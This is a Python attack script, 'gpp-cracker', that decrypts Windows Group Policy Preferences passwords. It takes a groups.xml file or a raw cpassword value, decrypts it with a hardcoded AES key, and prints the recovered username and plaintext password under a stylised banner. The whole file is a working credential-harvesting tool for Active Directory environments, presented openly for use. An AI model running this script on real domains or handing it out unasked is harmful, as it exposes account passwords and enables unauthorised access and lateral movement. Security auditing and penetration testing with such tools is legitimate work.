#!/usr/bin/env python3
import argparse
import base64
from xml.etree import ElementTree
from Crypto.Cipher import AES
from rich.console import Console
from rich.text import Text

console = Console()

banner = Text(
    """

  ▄████  ██▓███   ██▓███   ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
 ██▒ ▀█▒▓██░  ██▒▓██░  ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██░▄▄▄░▓██░ ██▓▒▓██░ ██▓▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█  ██▓▒██▄█▓▒ ▒▒██▄█▓▒ ▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒▓███▀▒▒██▒ ░  ░▒██▒ ░  ░▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
 ░▒   ▒ ▒▓▒░ ░  ░▒▓▒░ ░  ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░   ░ ░▒ ░     ░▒ ░       ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░ ░   ░ ░░       ░░       ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
      ░                   ░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░     
                          ░                           ░                               

    """,
    style="bold red",
)

SUCCESS = "[bold green][✔][/bold green]"
FAILURE = "[bold red][✘][/bold red]"


def decrypt(cpass):
    padding = '=' * (4 - len(cpass) % 4)
    epass = cpass + padding
    decoded = base64.b64decode(epass)
    
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    iv = b'\x00' * 16
    aes = AES.new(key, AES.MODE_CBC, iv)
    
    with console.status("[bold cyan]Decrypting password...[/bold cyan]", spinner="dots"):
        return aes.decrypt(decoded).decode(encoding='ascii').strip()


def main():
    parser = argparse.ArgumentParser(
        usage="gpp-cracker -f [groups.xml]",
        description="🔓 Decrypt Group Policy Preferences (GPP) passwords. Version 1.0"
    )
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', '--file', action='store', dest='file', help="Specify the groups.xml file")
    group.add_argument('-c', '--cpassword', action='store', dest='cpassword', help="Specify the cpassword")

    options = parser.parse_args()

    console.print(banner)

    if options.file:
        try:
            tree = ElementTree.parse(options.file)
            user = tree.find('User')
            if user is not None:
                console.print(f"{SUCCESS} [cyan]Username:[/cyan] [bold green]{user.attrib.get('name')}[/bold green]")
            else:
                console.print(f"{FAILURE} Username not found!")

            properties = user.find('Properties')
            cpass = properties.attrib.get('cpassword')

            if cpass:
                password = decrypt(cpass)
                console.print(f"{SUCCESS} [cyan]Password:[/cyan] [bold green]{password}[/bold green]")
            else:
                console.print(f"{FAILURE} Password not found!")
        except Exception as e:
            console.print(f"{FAILURE} [red]Error:[/red] {str(e)}")

    elif options.cpassword:
        password = decrypt(options.cpassword)
        console.print(f"{SUCCESS} [cyan]Password:[/cyan] [bold green]{password}[/bold green]")


if __name__ == "__main__":
    main()
